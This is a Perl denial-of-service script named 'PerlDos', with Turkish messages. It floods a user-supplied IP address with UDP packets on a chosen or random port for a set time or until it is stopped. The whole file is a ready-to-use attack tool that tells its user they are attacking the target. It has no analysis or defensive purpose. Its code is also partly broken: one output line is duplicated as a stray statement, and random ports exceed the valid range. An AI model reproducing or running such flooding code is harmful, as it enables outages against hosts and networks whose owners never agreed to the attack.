#!/usr/bin/perl

# mbe
# MBE Software - PerlDos
##

use Socket;
use strict;

my ($ip,$port,$boyut,$saniye) = @ARGV;

my ($iaddr,$bitissure,$pboyut,$pport);

$iaddr = inet_aton("$ip") or die "Host adi cozumlenemiyor. $ip\n";
$bitissure = time() + ($saniye ? $saniye : 99999999);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print "Developed by Burak Eyidogan*\n";
print "MBE Software - PerlDos ^^\n\n\n";

 print           "              Saldirdigin IP : $ip
			Saldiriliyor su porta " .
        ($port ? $port : "Port secilmedigi icin otomatik secildi") ." ".($saniye ? "$saniye saniye boyunca devam edecek" : "Izle Kardesim  ") . "\n";
        ($port ? $port : "Secim olmadigi icin otomatik secildi") ." ".($saniye ? "$saniye  saniye boyunca devam edecek" : "
Otur ve izle :trl  ") . "\n";
        print "Durdurmak icin Ctrl-C\n" unless $saniye;

for (;time() <= $bitissure;) {
  $pboyut = $boyut ? $boyut : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(6550000))+1;

  send(flood, pack("a$pboyut","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}
